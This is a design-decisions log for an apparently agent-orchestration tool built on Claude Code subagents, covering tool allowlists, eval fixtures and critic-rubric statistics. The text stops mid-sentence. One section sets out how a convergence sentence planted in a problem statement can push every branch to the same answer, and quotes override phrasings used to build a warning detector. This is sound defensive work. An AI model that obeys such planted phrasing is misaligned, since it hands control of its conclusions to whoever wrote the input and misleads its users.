# Open decisions

Resolve these before writing code. Each one has criteria, not an answer. Record the choice
and the reason in this file rather than in a commit message.

---

## D1. Runtime

TypeScript or Python for the CLI, the library and the MCP server. Pick one, use it for all
three.

Criteria: what the Claude Code plugin and MCP stdio tooling is best supported in today, what
the maintainer will actually keep patched, and which gives the cleaner YAML schema validation
story for `config/`.

Constraint: no inference dependency in either case. Nothing in this repo imports a model SDK.

**Decision:** TypeScript on Node 20+. Resolved 2026-09-06 by drewc611.

Reason: the MCP reference SDK is TypeScript, so the plugin's server entry is a single
`node dist/mcp.js` line with no interpreter setup. Zod schemas with `.strict()` reject unknown
keys by default, which is the exact property the enum only routing decision relies on: there
is no field the orchestrator can put prose into, and an extra key is a hard failure rather than
a warning. Runtime deps: `yaml`, `zod`, `commander`, `@modelcontextprotocol/sdk`. Tests on
`node:test`. Nothing imports a model SDK.

---

## D2. What the library does, given it cannot call a model

The execution constraint is firm: branches run as Claude Code subagents, no API. So the
library is not an inference layer. It is:

- A compiler. Problem statement plus routing plus frames produces N branch briefs and a
  `problem_hash`.
- A validator. Branch output conforms to the contract, hashes match, no paraphrase drift.
- A scorer. Applies `critic-rubric.yaml` weights to critic output deterministically.
- A harness. Runs `evals/fixtures/` and reports assertion hit rate.

The MCP server exposes the same four as tools. The host model supplies all inference. This is
a real constraint and it makes the repo testable without a key, which is worth more than it
costs.

**Decision:** Confirmed, with two additions. Resolved 2026-09-06 by drewc611.

1. The synthesis is rendered by code from the artifacts. No model writes it. That is how the
   pruned block is guaranteed to ship: a template has a slot for it, and a model cannot decide
   it looks like noise.
2. The orchestrator is the compiler. The host session contributes one routing decision whose
   every field is enum valued (see `config/routing.yaml`, `decision_schema`). Briefs are
   assembled from the verbatim problem, one frame record, and `prompts/branch.md`, and nothing
   else. "The orchestrator never reasons" is a schema property, not a prompt request.

Execution shape: a run directory state machine. `adhd run --phase compile|critique|deepen|synth
--run <dir>` reads what the host wrote, validates it, and emits the next briefs. The skill is
the driver; it spawns subagents and writes their output where the phase says. The MCP server
wraps the same phase functions over the same directory.

---

## D3. Determinism

Frames are shuffled before dispatch to reduce position bias. Shuffling makes runs
irreproducible, and eval fixtures need reproducibility.

Options: seed the shuffle and log the seed; shuffle only outside eval mode; or drop shuffling
and handle position bias in the critic instead.

**Decision:** Seed always, log the seed. Resolved 2026-09-06 by drewc611.

Every run has a seed: random unless `--seed` is given, written to `plan.json`. Fixtures carry a
fixed seed so `adhd eval` replays byte for byte. Pass A's blind shuffle uses the same seed.
Position bias is still spread across live runs because live seeds are random, and any run,
live or eval, can be reproduced from its plan. The other two options each give up one of those.

---

## D4. Tools for branches

`agents/branch.md` currently grants no tools. Rationale: a branch that goes and searches has
left its frame, and the whole point is stance purity.

But `PRIOR_ART` is unrunnable without search, and `FIRST_PRINCIPLES` is actively harmed by it.
Per frame tool grants are the obvious fix and add a field to `frames.yaml`.

**Decision:** Per frame allowlist, default none. Resolved 2026-09-06 by drewc611.

`frames.yaml` gets a `tools` field on every frame, default `[]`. The only grantable values are
`WebSearch` and `WebFetch`, enforced by schema (`routing.yaml`, `branch_tools_allowed`).
`PRIOR_ART` gets both. `FIRST_PRINCIPLES` and every other frame get nothing.

Filesystem tools are never grantable, and this is tighter than the option as first proposed.
`Read`, `Grep`, and `Glob` on a branch are a channel to sibling artifacts in the run directory,
and sibling visibility is the one thing the architecture exists to prevent. So briefs reach a
branch inline in the spawn instruction, the branch returns its YAML as its final message, and
the host writes it to the artifact path. The `problem_hash` echo catches host paraphrase.

Mechanism: Claude Code loads agent definitions from fixed directories, so per run generation
is not available. Instead there is one static agent per tool profile (`agents/adhd-branch.md`,
`agents/adhd-branch-search.md` with the two web tools) and `plan.json` names which one each
brief needs. The brief also states its grant so a mismatch is visible.

One wrinkle, found against the Claude Code docs after the first real run: the host refuses to
launch an agent with zero tools, and `tools: []` is treated as zero. So `adhd-branch`,
`adhd-critic`, and `adhd-deepen` carry exactly one tool, `TaskList`, which is read only,
touches no file, reaches no network, and spawns nothing. It is a launch permit, not a
capability.

**The launch permit rests on an untested claim, and this is the honest statement of it.** Read
only, no file, no network and no spawn are all true and none of them is the question. The
non-negotiable is that branches never see siblings, and what `TaskList` returns inside a running
ADHD dispatch has never been observed. An attempt to check it from a subagent in this repository
returned "tool unavailable", which settles nothing: that subagent was not a plugin agent
declaring the grant. Until a real plugin run reports what it sees, treat this as the one
isolation claim in the design that is argued rather than demonstrated. If it turns out to leak,
the fix is a different launch permit, not a weaker rule.

`test/agents.test.ts` checks the grants as an **allowlist**, not a denylist. It was a denylist,
naming filesystem and network tools, which left every tool nobody had thought of passing
silently, and the dangerous ones are exactly what a future edit would reach for: `Agent` and
`SendMessage` reach another agent, `TaskCreate` and `TaskOutput` reach another task, and any
`mcp__*` tool reaches whatever its server does. Each agent file must now grant exactly its
permitted set, a new agent file fails until it has an entry, and changing a grant means arguing
for it here first.

---

## D5. The run's own bail out path

An ADHD run spawns N subagents and takes minutes. The user watching it has no way out.

That is fixture 001 pointed at this repo. Whatever the eval fixture demands of an HTTP client
this system owes its own user: a visible cancel, partial results on cancel rather than
nothing, and an honest cost estimate before the spend rather than after.

Partial results on cancel is the harder half. Branches that already returned are usable
without the critic pass, and shipping them unscored with a clear "unscored, divergence only"
label is better than discarding the spend.

**Decision:** Estimate, gate, cancel, partial. All four ship in v0. Resolved 2026-09-06 by
drewc611.

1. **Estimate before the spend.** `compile` prints the verbatim problem, its hash, the frames
   selected, N, and a token estimate (`tokens_per_branch_estimate` times N, plus critic and
   deepen). The skill shows it and waits for a yes. `--yes` skips the wait for scripted use.
   The preview doubles as the paraphrase check: the user sees exactly what was hashed.
2. **Phase boundaries are free exits.** Every phase is a separate command. Stopping between
   two costs nothing and loses nothing; the run directory holds every artifact so far.
3. **Cancel mid diverge yields partial results.** The skill stops spawning. `adhd run --phase
   synth --partial` renders whatever branch artifacts exist, runs code lints only, no critic,
   no clustering, no recommendation, and labels the output `UNSCORED, divergence only`. The
   spend already made is returned to the user rather than discarded.
4. **Refusal paths.** `hard_cap` 9 behind `--allow-wide`. `decline` classes in routing produce
   no briefs and a one line reason.

---

## D6. Frame library growth

Thirteen frames across ten axes. The pressure will be to add more. Resist it.

Adding a frame requires: name a problem where it and every existing frame reach materially
different positions, and show it on a fixture. Frames that agree with an existing frame on
every fixture are duplicates wearing different words, and they cost a full branch each.

The eval harness should report pairwise frame agreement across all runs so duplicates surface
as data rather than opinion.

**Decision:** Standing policy, no action needed until frame 14 is proposed.

Static check, enforced at validation time from v0: every frame declares one `axis` and a non
empty `attacks` and `forbidden`; a single run never contains two frames on the same axis; the
union of `attacks` covers T1 through T7. Empirical check, `adhd frames --orthogonality`, reads
`evals/recorded/` and reports pairwise co-cluster rate; a pair above 60% on shared runs is
flagged. That report is the data D6 asks for.

Library as of 2026-09-06: PARTICULARIST, FRAME_BREAKER, ACTOR_CENSUS, LEDGER, DOOR_KEEPER,
MECHANIC, SABOTEUR, MINIMALIST, NIGHT_OPERATOR, PRIOR_ART, FIRST_PRINCIPLES, SUPPLICANT, SUCCESSOR.
The last four were added at the owner's request to reach thirteen. They have not yet been
shown to diverge on a fixture. That is a debt against this policy and `adhd frames
--orthogonality` is how it gets paid.

Run data so far (two runs, one per fixture): the `fuzzy_debugging` frame set (MECHANIC,
PARTICULARIST, SABOTEUR, NIGHT_OPERATOR, FRAME_BREAKER) did not surface fixture 002's
`who_is_hurt` item. No frame in that set asks who the tail latency lands on. The frames that
ask that question (SUPPLICANT, ACTOR_CENSUS, LEDGER) are all on the actors and cost axes and
none is in the fuzzy debugging primary set. Whether to swap one in is a routing decision for
the owner; it should be made on a second run, not on this one. The recorded run is marked
`expected: fail` so the harness verifies the miss stays recorded rather than hiding it.

The second run exists: `evals/recorded/002-kernel-enduser/`, SUPPLICANT swapped in for
NIGHT_OPERATOR via an explicit `frames` list, driven by the kernel. It passes fixture 002.
SUPPLICANT asked who is hurt and was pruned for it (T1, T7, T8); the question reached the output
through the pruned block. So the frame closes the gap as a question-raiser, not as a
recommendation. Swapping it into the `fuzzy_debugging` primary set is now a decision with two
runs behind it. Still the owner's.

### What five runs say about the library

`adhd frames --stats` reports per-frame behaviour across every recorded run. As of five runs,
twelve of thirteen frames have been dispatched at least once and the counts are already
saying three things, none of them yet a verdict:

> **Corrected 2026-09-07 by E1a.** Every rate in this section is a one-or-two-sample figure and
> at least one of them is now known to move. Running fixture 001 again at seed 2 with the same
> five frames turned two of five pruned into four of five: ACTOR_CENSUS went from holding the
> recommendation to pruned, and FRAME_BREAKER from survivor to pruned. Read what follows as what
> the corpus happened to show, not as per-frame behaviour. `docs/EXPERIMENTS.md` has the result.


- **SUPPLICANT is pruned every time it appears (2/2).** It is also the frame that closed the
  `who_is_hurt` gap in `002-kernel-enduser`, and it did so *through the pruned block*. A frame
  that reliably fails the rubric and reliably produces the missing question is not a bad frame;
  it is a frame whose value the rubric does not measure. Either the rubric is incomplete or
  SUPPLICANT belongs in a different role. Do not resolve this on two runs.
- **DOOR_KEEPER, SUCCESSOR and MECHANIC have never been pruned (0/2 each).** Being unprunable is
  not obviously good. A frame no detector ever catches may be well-designed or may simply be
  producing safe answers the critic has no grounds to reject.
- **T3 and T5 have never fired.** T5 (no "do X" sentence) is close to structurally unable to
  fire, because the output contract demands a committal position, so a branch that trips T5 has
  usually already failed validation. T3 (citation trap) needs a branch that cites, and only
  PRIOR_ART carries search tools. Both may be correct prevention rather than dead weight, and
  the counts cannot distinguish those. Recorded so the question stays open.

FIRST_PRINCIPLES has never been dispatched in a recorded run. It is in no primary set, only in
`alternates`, so nothing is wrong; it simply has no evidence behind it either way.

### The negative control that beat a real run

Every fixture now ships a linear chain-of-thought control that must fail. Writing the one for
fixture 004 produced the least comfortable result the repo has: **it passes `false_means`, the
single item the real run `004-kernel-naming` failed.**

It passes on a stock style-guide line about avoiding double negatives. Five isolated frames, a
blind rubric, a full trap sweep and a deepen round did not reach the question; a memorised
convention did. That is a real limit on what divergence buys, and it belongs in the record
rather than in a quietly loosened fixture.

The open question, which is the owner's: is this a gap in the frame set (no frame asks what a
thing asserts in its negative case) or a badly chosen assertion (matching "double negative"
rewards reciting a rule rather than reasoning about the negative case)? Do not resolve it by
editing the pattern until the answer is decided on its merits.

### Four assertions that do not discriminate

`adhd eval --audit` replays every fixture assertion against the real runs and the negative
controls separately. An assertion the control also satisfies is not measuring divergence: the
consensus answer already clears it. Finding `false_means` that way was luck; the audit makes it
mechanical. On the nine recorded runs it first ran over it flagged four of twenty-one assertions:

| assertion | the control text that satisfied it |
|---|---|
| `002/periodic_actor` | "Cron" |
| `003/reframe` | "release cadence" |
| `003/who_pays` | "on call" |
| `004/false_means` | "double negative" |

None of these is automatically a bug in the fixture. Two readings apply to each, the same pair
as for `false_means`: the assertion may be asking for something the consensus answer genuinely
supplies (in which case the fixture is testing the wrong thing), or the frame set may have a
gap the control happens to cover.

`002/periodic_actor` is the clearest case for the first reading. Listing cron and GC is exactly
what the consensus answer is good at, so requiring the words proves nothing about divergence;
what the run should be asked for is which periodic actor and how the period was established.
`003/who_pays` matching "on call" is close behind.

**Resolved, 2026-09-07, each on its own argument.** They were left standing at first because
rewriting four assertions immediately after seeing which ones the controls cleared is how a
harness gets tuned until it always passes. Reading the per-alternative evidence rather than the
audit's summary line shows the four are four different things, and only one of them is the
judgment call the table implies.

**`003/who_pays` was a regex defect, not a judgment.** The pattern is `on.call`, and `.` matches
any character, so it fired on "functi**on call**s" in the sentence "network calls replace function
calls". The control never mentions on-call at all; the word appears once in it and that once is
inside another word. Fixed to `\bon[- ]?call`, which anchors the first word and spells the
separator. Two others had the same shape latent, `one.way` and `two.way door`, and are fixed the
same way. This is the fixture-side twin of the redaction bug, where matching `door keeper` as a
literal token missed `door-keeper`, `doorkeeper` and `DoorKeeper`. A test now rejects any fixture
pattern using a bare dot between two letters.

After the fix `003/who_pays` is 1/1 real, 0/1 control. The real run matched five alternatives on
content the control has nothing like: "paid by whoever holds the pager and by finance", "the
on-call bill is invisible because it is paid at 3am by individuals, not in a budget line".

**`002/periodic_actor` was removed from the fixture, not loosened.** The control satisfied seven
of its nine alternatives, and reading it says why: linear CoT gets the class of cause right. Its
opening line is "spikes are almost always caused by something running on a schedule". Naming a
periodic actor was never the divergent contribution, and fixture 002's own `why` never claimed it
was — that paragraph names three things a passing run does, and this was not one of them. What
the real runs do with the period is a different matter and `cheap_first` already asks for it:
both correlate spike timestamps against the schedule and pause a candidate to confirm, where the
control hands the list back. That distinction is not lexical and no keyword list reaches it.

**`004/false_means` lost the two alternatives that rewarded recitation.** "Avoid negations,
`disable_old_checkout` forces the reader to think in double negatives" is in every naming style
guide, which is where the control got it; the tokens `double negative` and `negat` name a
convention, while the assertion asks what the name asserts when the flag is off. Removing them
costs nothing on the real side, because `004-kernel-naming` matched no alternative at all. The
verdict moves from "matches a control" to **never matched**, which is the honest report: this is
a frame-set gap, backlog item 17, and 004 stays recorded as failing on it.

**`003/reframe` stays flagged, and the fixture carries the reason.** Only one of its eight
alternatives has ever fired — the deploy/release-pain one — and it fired in the real run and the
control on opposite uses. "If the pain is coupling or deploy cadence" is the reframe the assertion
asks for; "teams gain autonomy over their own stack and release cadence" is microservices
advocacy. Every other alternative encodes a stance and this one encodes a topic, which is why it
admits both. Deleting it would flip `003-kernel-strategy` to failing on a reframe the run
demonstrably made. Writing a stance pattern instead would be fitted to the two texts just read,
which is the failure the whole section exists to avoid. It needs a run that has not happened, not
a better regex written today.

No recorded run's outcome changed under any of this, which is the signature the change should
have: three assertions that measured nothing now measure nothing more visibly, and nothing was
made easier to pass.

Third class run: `evals/recorded/003-kernel-strategy/`, the `strategy` set (FRAME_BREAKER,
LEDGER, DOOR_KEEPER, PRIOR_ART, SUCCESSOR) on fixture 003. It passes. The set was not a
monoculture by the critic's clustering (three clusters), but every one of the five positions
opened with "do not rewrite", and two were pruned for T1: their reasoning would serve any
rewrite question. The frames that survived were the ones whose mechanism is specific to this
shape of problem (one way doors, the maintainer two years on, the bill and who pays it). One
run, one seed. `adhd frames --orthogonality` now sees four runs and flags nothing; no pair has
three shared runs yet.

---

**Blindness costs text, and two labels cost more than they protect.** Redaction removes every
frame label from what pass A reads, ids and display names alike, and it cannot tell "from inside
the End user stance" from "the end user behind that caller". `adhd frames --collisions` counts
which labels turn up in artifacts their frame did not write, across 29 recorded artifacts:

| label | foreign uses | own uses |
|---|---|---|
| End user / SUPPLICANT | 5 | 0 |
| Horizon / SUCCESSOR | 1 | 0 |

Nothing else collides. SUPPLICANT has never written its own label; ACTOR_CENSUS and LEDGER wrote
it five times between them, once inside a `missing_actor` field, and the redactor removes all
five. The critic then scores an actor census that appears not to name an actor, on
`actor_coverage`.

Three things were done. The pass A prompt now tells the critic that `[frame]` is machine
redaction of a real noun phrase, to be read through rather than scored as vagueness. Separator
spellings are now caught, which made redaction stricter, not looser: "door-keeper", "doorkeeper",
"DoorKeeper" and a line break between the words all leaked before, which is nine of thirteen
frames.

**And the two frames were renamed, 2026-09-07, on the owner's call.** `END_USER` became
`SUPPLICANT` and `HORIZON` became `SUCCESSOR`. Both new names were picked mechanically rather
than by ear: every candidate was matched against all 39 recorded artifacts, all eleven synthesis
files and all eight fixtures, and only names that appear nowhere in the corpus were eligible.
`Supplicant` and `Successor` are clean; so were `Petitioner`, `Captive`, `Inheritor` and
`Latecomer`, and `The waiting` was rejected because it collided eight times. `adhd frames
--collisions` now reports every label as discriminating.

The names also state the stance rather than the setting, which is what made the old ones prose in
the first place. `HORIZON` named a timescale, so any branch reasoning about one wrote the word —
`FRAME_BREAKER` wrote "a one year horizon" in a run the frame was not even in. `SUCCESSOR` names
the person who inherits the decision, which is what the stance actually asks the branch to be.

**What was not done is rewriting the recorded runs.** Five runs write `END_USER` and `HORIZON`
into `plan.json`, `blind-map.json`, `score.json`, `pass-b.yaml`, their branch and deepen
filenames, their `synthesis.md` and the append-only `os.json` journal. Editing those to match
would make a run's record claim a frame ran that did not exist when it ran, which is falsifying
evidence to tidy a name. So `config/frames.yaml` carries `former_ids` and the library forwards:
every reader of a recorded run maps the old id to the current one at the point it reads it, so
the corpus stays one corpus, and `adhd why <run> END_USER` still resolves for anyone holding an
older note. `adhd traps` accepts a former id too, or five runs of history would fail their own
contract check.

`former_ids` are deliberately **not** redaction tokens. A frame is renamed precisely because its
old label was ordinary prose; re-adding it to the redactor would reinstate the collision the
rename exists to remove. `crossCheck` rejects a `former_id` that is also a live id, or that two
frames both claim, because either makes a recorded run ambiguous.

One caveat the rename does not remove: zero own uses across five runs is still a small sample. A
future artifact from this frame writing "the end user" would have been identifying itself, and
redaction would have been right to remove it. The rename resolves that by making the question
moot rather than by answering it.

---

**The problem statement is the one channel isolation cannot defend.** Every other attack surface
in this design is protected by separate context windows. A convergence sentence in the problem is
not: it reaches all five branches verbatim, compromises them identically, and leaves no branch
anomalous against its siblings. The critic reads artifacts, not the problem that produced them,
so a run under a hostile problem reports cross-frame agreement, which is the strongest signal the
system can emit, pointing wherever the injector chose.

The defence is the D5 gate and nothing else. `lintProblemInjection` warns, never blocks: the
verbatim passthrough is the architecture, a person may legitimately be asking about prompt
injection, and the orchestrator does not get to decide what a problem is allowed to say. Fixture
008 asserts the gate rather than a run.

Building that fixture showed the detector was close to useless. The patterns were written in this
architecture's own vocabulary — branch, frame, diverge — and an injector writing a problem
statement does not know those words. They write "all approaches should agree", because "approach"
is what a person calls a line of reasoning. Of eighteen realistic phrasings, seven fired and
eleven went through, including the two most natural ways to manufacture the consensus trap.
Rebuilt from what an outsider would say: twenty caught, zero false positives across ten ordinary
problem statements, still linear on adversarial input.

The false positives are why the override patterns are anchored to a clause boundary. "Users
ignore the previous version of the onboarding flow" is a sentence about user behaviour and fired
before that; "and ignore any framing you were given" is an injection and still does. A warning
that cries wolf on ordinary problems is a warning the user learns to skip, which is the same as
not having one.

---

## D7. The kernel: ADHD as an agent operating system

**Question.** Can the four-phase loop run unattended without anything in the repo calling a
model?

**Decision.** Yes, as a scheduler that hosts feed. Resolved 2026-09-06 by drewc611 (the
owner asked for "an OS, agentic" with MCP tool calls as the work source).

`src/os.ts` is a kernel over run directories: submit, confirm, claim, return, status, result,
cancel, list, reap. Runs are processes with states; tasks are leased threads a worker claims
and returns. The kernel calls the same phase functions the CLI does, so every invariant in
CLAUDE.md is enforced by the same code. It never composes a prompt and never spawns anything.
Workers (a Claude Code session running `skills/adhd-worker`, or any MCP client) supply the
inference. `docs/OS.md` has the model and the syscall table.

Consequences kept from earlier decisions: D2 (no inference client) holds because the kernel
has no execution path; D4 holds because briefs are handed to workers inline and artifacts come
back as text; D5 holds because `submit` stops at `awaiting_confirm`, `cancel` renders partial
at any point, and a task cannot be leased more than three times.

What the kernel does not decide: which model runs a branch, when a worker runs, or how a
worker resumes the pass A critic for pass B (`continues` names the task; the host keeps the
agent id).

---

## D8. Refining the rubric on recorded runs instead of on taste

**Question.** The critic rubric has nine dimensions and hand-set weights. Nobody has ever
checked whether the weights change any outcome, or whether nine dimensions measure nine things.
Can either be answered without adding a model?

**Decision.** Yes, from the runs already on disk. Resolved 2026-09-07 by drewc611, who chose a
learning loop over recorded runs when the alternative on the table was training a transformer.
No model, no keys, no inference client: `src/learn.ts` is pure functions over `evals/recorded`,
and `adhd learn --sensitivity` / `--correlation` print what they find. Negative controls are
excluded, because a control is a hand-written consensus answer, not a critic's scoring.

**What the weights decide.** Pass A prunes nothing. A fired trap does that. What pass A decides
is which survivor represents its cluster, and the representative is the position that goes to
deepen and, if it defends, becomes the recommendation. So the perturbation moves representatives,
not prunes. Feature 4 in `docs/FEATURES.md` was written the wrong way round and is corrected
there.

**Finding 1: the weights are not doing the choosing.** Across 5 real runs there are 4 contested
cluster decisions (more than one survivor). Moving any single dimension's weight by ±1 changes
0 of them. On this corpus a different weight vector ships the same answer. That is a reason to
stop arguing about weights, not evidence that the weights are right; 4 decisions is a pointer.

**Finding 2: two dimensions are pinned at the ceiling.** Over 25 scored artifacts, no pair of
dimensions correlates above 0.47 (falsifiability and assumption_attack), so nothing is obviously
one dimension charging twice. But `foreclosure` (mean 2.96, sd 0.20) and `reasoning_carries`
(mean 2.92, sd 0.39) score the maximum on 96% of artifacts, two distinct values each. Both carry
weight 2 and 1 respectively and add a near-constant to every total. They vary, so a flat-variance
check misses them; a near-constant correlates with nothing, so the correlation matrix misses them
too. Detecting that needed its own check, and `CEILING = 0.85` is it.

Compare `specificity` (mean 1.72, 12% at ceiling, weight 3) and `reversibility` (mean 1.76, four
distinct values). Those two are doing the separating.

**What this does not settle.** Whether the ceiling means the bar is too low, or the output
contract already guarantees what the dimension asks. `forecloses` is a required non-empty array
and `reasoning` is a required field, so the contract does guarantee something in both cases. If
the contract is doing the work, the dimension is scoring compliance, not divergence value, and
that is a rubric change — deferred to the owner, not made here. Re-run `adhd learn --correlation`
after the corpus grows past 25 artifacts before touching either anchor set.

**Cost of getting this wrong.** Tuning anchors until the ceiling clears would raise the scores'
spread without raising their meaning, and the harness would keep passing. That is the same
failure as rewriting a fixture assertion after seeing which controls cleared it, recorded under
D6, and it is refused for the same reason.

**Finding 3: the critics agree, and one run in five would still have shipped a different
answer.** Every real run's artifact pack was scored a second time by a fresh critic in a separate
context window, from `critic/pass-a.brief.md` verbatim, instructed to read no other file. Each
second scoring is kept beside the first as `critic/pass-a.rater2.yaml`; every run still ships on
`pass-a.yaml` and no `score.json` changed.

Pooled over 225 cells from 5 runs: **79% exact, 100% within one point**. Not one cell in the
corpus disagreed by two.

| | exact | mean abs diff |
|---|---|---|
| specificity (weight 3) | 68% | 0.32 |
| substance | 68% | 0.32 |
| reversibility | 72% | 0.28 |
| assumption_attack | 76% | 0.24 |
| actor_coverage | 76% | 0.24 |
| committal | 80% | 0.20 |
| falsifiability | 80% | 0.20 |
| foreclosure | 92% | 0.08 |
| reasoning_carries | 96% | 0.04 |

**The two dimensions the critics agree on most are the two pinned at the ceiling.** `foreclosure`
and `reasoning_carries` score the maximum on 96% of artifacts (Finding 2) and agree at 92% and
96%. That is one fact reached from two directions: they agree because almost every artifact gets
a 3. High inter-rater agreement is not evidence a dimension is well defined when the dimension
barely varies.

`specificity` carries the highest weight in the rubric and has the worst agreement. It is also
the dimension whose anchors ask the critic to do something (delete the three most specific
details and re-read) rather than to recognise something.

**Every ranking changed. One outcome did.**

| run | exact | ranking | representative |
|---|---|---|---|
| 001-first-run | 69% | changed | same |
| 002-first-run | 73% | changed | same |
| 002-kernel-enduser | 78% | changed | **FRAME_BREAKER → PARTICULARIST** |
| 003-kernel-strategy | 84% | changed | same |
| 004-kernel-naming | 89% | changed | same |

In `002-kernel-enduser` the second critic sends PARTICULARIST to deepen instead of FRAME_BREAKER
in the `measure_the_period_first` cluster. That run's recommendation depends on which critic read
it. Recorded, not smoothed: it is the exact failure `--agreement` was built to find, and it fired
on the fifth pack tried.

**What clustering is doing.** Cross-cluster rank disagreement is structurally inert: each cluster
sends its own representative regardless of how it ranks against another's. 5 of 5 rankings moved
and 1 of 5 outcomes did. So cell agreement and ranking agreement both overstate how much the
critic decides, and `adhd learn --agreement` prints all three with the weakest ones labelled as
such. That is a stronger argument for clustering than the design reasoning that produced it.

**Five runs, one second critic each, and four on the pack that split.** 225 cells is a first
corpus, not a reliability figure. Quote 79% with the sample size attached or not at all.

---

**Finding 4: pass A separates cluster survivors by almost nothing, and one decision was an exact
tie.** Two raters cannot tell an ambiguous rubric from an idiosyncratic critic, so
`002-kernel-enduser` was scored twice more, blind, same conditions. `adhd learn --panel` reads a
panel of any size.

Four critics, 76% of cells scored identically, no cell off by more than one point, and the
cluster splits **2-2**: FRAME_BREAKER for the shipped critic and rater4, PARTICULARIST for raters
2 and 3. Not one critic reading it oddly. The rubric does not determine the answer.

The weighted totals say why. All four critics score FRAME_BREAKER at exactly 0.9167 and SABOTEUR
at exactly 0.8958. Only PARTICULARIST moves, across 0.8750, 0.9375, 0.9375, 0.9167 — and rater4's
0.9167 is an **exact tie** with FRAME_BREAKER, so what shipped was decided by `localeCompare` in
`pick()`, not by the rubric. That is not a close decision. It is no decision.

It is not one cluster. Every contested representative decision in the corpus is settled inside
two anchor points out of 48:

| run | cluster | margin |
|---|---|---|
| 002-kernel-enduser | measure_the_period_first | 0.0208 (one anchor point) |
| 001-first-run | caller_owned_deadline | 0.0208 (one anchor point) |
| 002-first-run | find_the_sawtooth | 0.0417 |
| 003-kernel-strategy | extract_one_then_gate | 0.0417 |

**This reframes Finding 1.** "0 of 4 representatives flip under ±1 weight moves" reads as
stability and is not stability: these decisions were never wide. A weight move rescales every
artifact's total in the same direction, so it moves ranking far less than a single anchor read
differently does. The representatives are not stable because the rubric is decisive; they are
close enough that any of them could ship. `--sensitivity` now prints the margins directly beneath
the flip count, because the flip count alone is misleading.

**What it does not settle, and what should not be done about it.** The obvious fix, spreading the
anchors so survivors separate further, would manufacture confidence rather than measure it: the
positions genuinely are close, and a rubric that says so is telling the truth. Three candidate
responses, none taken here:

1. Send every survivor within one anchor point to deepen, not just the top one. Costs a subagent
   per extra position and admits the tie instead of hiding it.
2. Break ties on something meaningful (fewest fired traps, widest `forecloses`) rather than
   alphabetically. Cheap, and at least the rule would be defensible.
3. Leave it, and print the margin in the synthesis so a reader sees the representative won by a
   hair.

Options 1 and 2 change what ships and belong to the owner. **Option 3 was taken**, because it
changes no decision and the alternative was silence: `pick()` breaks ties alphabetically, nothing
downstream said so, and the run read as though a decision had been made. The synthesis now carries
a **Close call** line under the recommendation whenever the representative led its runner up by
two anchor points or fewer:

- at an exact tie, that the two scored level and the winner was chosen by frame id, and that the
  runner up's position in the corroborating block is as well supported;
- otherwise, the margin against the anchor step, and that one anchor read the other way would
  have sent the other frame instead.

`--sensitivity` prints the same margins beneath the flip count. The recorded runs' `synthesis.md`
files predate the note and are left as they were rendered: they are the record of what those runs
produced, not a place to backfill.

---

**Finding 5: two of nine dimensions are measuring the output contract, not the reasoning.** Over
seven real runs and 35 scored artifacts, `foreclosure` sits at its top anchor 91% of the time and
`reasoning_carries` 94%. Both have two distinct values in the whole corpus. A dimension that
almost never varies still contributes its weight to every total, so it raises every score by
roughly a constant and separates nothing.

The corpus says why, for each, and the two mechanisms are different.

`foreclosure` asks whether `forecloses` rules out things a reasonable person might otherwise do.
The output contract already requires a non-empty `forecloses` array and rejects the artifact
otherwise, so anchor 0 ("empty, or rules out only straw options") is half unreachable by
construction. The critic is scoring compliance with a schema the validator already enforced.

`reasoning_carries` asks what survives when every citation is removed. Its top anchor is "no
authorities were needed and none were used" — and twelve of the thirteen frames have no web tools
under D4, so they cannot cite an authority even if the reasoning wanted one. The dimension reads
as a near-constant 3 because the tool allowlist makes it one. The single run where a frame did
have search, `PRIOR_ART` in E1b, is also the only run in the corpus where T3 has ever fired.

**The 2-versus-3 boundary tracks nothing measurable.** Three artifacts scored 2 on `foreclosure`
against 32 at 3. Their `forecloses` arrays average 2.7 entries against 3.0, and 19.9 words against
23.1. `001-first-run/LEDGER` scored 2 while satisfying anchor 3 verbatim: its entries name
specific, tempting options in concrete terms. On this evidence the boundary is critic noise, not a
property of the artifacts.

**Recommendation for a v1 rubric, not applied here.**

1. Rewrite `foreclosure`'s anchors so the contract's floor is anchor 0 and the scale starts above
   it — an artifact that merely fills the array has met the contract, not the dimension.
2. Either drop `reasoning_carries` or make it conditional on the frame having had tools. Scoring
   an unciteable artifact for not citing is measuring D4.
3. Whatever is done, bump `version` in `config/critic-rubric.yaml`.

**Why none of it is done in this change.** `pass_a` is a weighted total, so two artifacts are only
comparable if the same weights and anchors produced them. Rewriting anchors mid-corpus splits the
35 scored artifacts into two halves that look comparable and are not, and every figure in Findings
1 through 4 is drawn from that pool. The prerequisite shipped instead: `score.json` now records
`rubric_version`, so a future rubric change is legible in the corpus rather than invisible. The
rubric change itself is the owner's call and belongs in `docs/BACKLOG.md` until it is made.

## D9. Where the D2 boundary actually falls, given the ask was "build a transformer into this"

**Asked.** Build a transformer into the architecture and add Python ML trained for it.

**Resolved.** No transformer in the run path. A Python package under `analysis/` that measures the
recorded corpus, including one small supervised model used as an instrument.

The ask has three readings and they do not have the same answer.

**A transformer in the run path is D2 with extra steps.** A transformer that produced or scored
reasoning would have to be pretrained, because 35 artifacts is not a training set, and a
pretrained model shipped with the repository is an inference client whether it arrives as an API
key or as a weights file. CLAUDE.md's line is "no API, no provider SDK, no keys anywhere" and D2's
argument for it is not about cost or vendor lock-in. It is that branch isolation is the entire
mechanism, and isolation is a property of separate context windows, not of an instruction to
ignore what you read above. A local model scoring branches would sit outside that guarantee and
the repository would no longer be a demonstration of the thing it claims.

**Training a transformer on this corpus is arithmetic, not policy.** The corpus is roughly 35,000
tokens across seven runs. A model small enough to train on it cannot do anything, and a model
large enough to do something cannot be trained on it. That is true regardless of what D2 says.

**Measuring the corpus with statistics and one small model is neither.** `analysis/` reads
`evals/recorded/` and writes text. It runs after runs, never during one. Nothing under `src/`
imports it, and a test in the TypeScript suite would be the place to enforce that if it ever
looks like changing. It makes no decision a run depends on: delete the directory and every run
behaves identically.

The line, stated so a future change can be checked against it: **a model that changes what a run
outputs is banned; a model that describes what runs already output is a measuring instrument.**
`signal.py` is on the second side of it because the outcome it predicts is `pruned`, which is
decided by trap detectors, and its output goes into a report a human reads. Move it into the
prune decision and it crosses the line, and at 71% leave-one-run-out accuracy it would also be
worse than the detectors it replaced.

**What it found, which is why the boundary was worth drawing rather than just declining.** The
repository's headline reliability figure — 79% exact critic agreement over 225 cells — is highest
on the dimensions that vary least. Corrected for chance, `foreclosure` has alpha -0.017 with a
95% interval of [-0.04, +0.00] and 96% exact agreement; `reversibility` has alpha +0.850 and 76%
exact agreement. The two rankings invert. D8 finding 5 named `foreclosure` and `reasoning_carries`
